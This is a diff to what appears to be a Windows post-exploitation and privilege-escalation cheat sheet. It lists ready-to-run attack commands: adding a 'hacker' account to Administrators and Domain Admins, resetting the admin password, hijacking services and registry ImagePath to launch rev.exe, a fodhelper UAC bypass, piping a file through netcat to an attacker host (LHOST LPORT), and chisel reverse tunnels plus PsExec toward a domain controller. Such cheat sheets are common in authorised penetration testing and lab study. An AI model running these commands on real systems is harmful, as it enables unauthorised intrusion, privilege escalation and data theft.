@@ -14,9 +14,11 @@ net user
 net user /domain
 net user /domain some_user_name
 net user %username%
-net localgroup <group> <user> /add # add user to group
-net user admin Password1! # change password
-net group "Domain Admins" <user> /ADD /DOMAIN
+net user hacker some_diff_pass /add          # create local user hacker with password some_diff_password
+net localgroup administrators hacker /add        # add hacker to administrators group
+net user hacker some_diff_pass /add /domain  # create domain user hacker with password some_diff_password
+net group "Domain Admins" hacker /ADD /DOMAIN    # add user to domain admins
+net user admin some_diff_pass                        # change password
 
 # network
 ipconfig /all
@@ -30,9 +32,11 @@ schtasks /query /fo LIST /v
 schtasks
 
 # files
+dir network-secret.txt /s /p
 accesschk.exe -uws "Everyone" "C:\Program Files"
 mountvol
 dir /S /B
+robocopy . . /l /s /njh /njs /ns /lev:3
 CACLS file_path /e /p <user>:F # set full permissions to file
 icacls "C:\"
 accesschk.exe -uws "Everyone" "C:\Program Files"
@@ -67,12 +71,12 @@ reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallEle
 msiexec /quiet /qn /i C:\Windows\tasks\rev.msi
 
 # services
-sc create service-name binPath= "C:\windows\tasks\rev.exe"
-sc config service-name binpath="c:\windows\tasks\rev.exe" # set binpath
-wmic service service-name get Pathname
-sc query service-name 5000
-sc start service-name
-sc stop service-name
+sc create hacking binPath= "C:\windows\tasks\rev.exe"
+sc config hacking binpath="c:\windows\tasks\rev.exe" # set binpath
+wmic service hacking get Pathname
+sc query hacking 5000
+sc start hacking
+sc stop hacking
 
 ## unquoted path
 C:\Windows\tasks\accesschk.exe /accepteula -uwcqv user *
@@ -82,11 +86,7 @@ C:\Windows\tasks\accesschk.exe /accepteula -uwdq "C:\Some Path\to\service"
 C:\Windows\tasks\accesschk.exe /accepteula -quvw "C:\Program Files\File Permissions Service\<service-exe>.exe"
 copy C:\Windows\tasks\rev.exe "C:\Program Files\File Permissions Service\<service-exe>.exe" /Y
 
-# registry
-reg query HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\Installer
-reg query HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\Installer
-
-## weak registry permission
+# weak registry permission
 C:\Windows\tasks\accesschk.exe /accepteula -uvwqk HKLM\System\CurrentControlSet\Services\<service>
 reg add HKLM\SYSTEM\CurrentControlSet\services\<service> /v ImagePath /t REG_EXPAND_SZ /d C:\Windows\tasks\rev.exe /f
 
@@ -94,7 +94,15 @@ reg add HKLM\SYSTEM\CurrentControlSet\services\<service> /v ImagePath /t REG_EXP
 REG ADD HKCU\Software\Classes\ms-settings\Shell\Open\command /d "c:\windows\tasks\rev.exe" /f
 C:\Windows\Sysnative\cmd.exe /c "powershell Start-Process C:\Windows\System32\fodhelper.exe -WindowStyle Hidden
 
+New-Item "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Force
+New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "DelegateExecute" -Value "" -Force
+Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "(default)" -Value "cmd.exe /c C:\windows\tasks\rev.exe" -Force
+Start-Process "C:\Windows\System32\fodhelper.exe" -WindowStyle Hidden
+
 # other
 type important_file.txt | nc.exe LHOST LPORT
 powershell.exe -executionpolicy bypass -file some_file.ps1
 powershell.exe Start-Process cmd.exe -Verb runAs
+.\chisel_win86.exe client kali-docker:9999 R:socks
+.\chisel_win64.exe client kali-docker:9999 R:socks
+.\PsExec64.exe \\dc cmd.exe
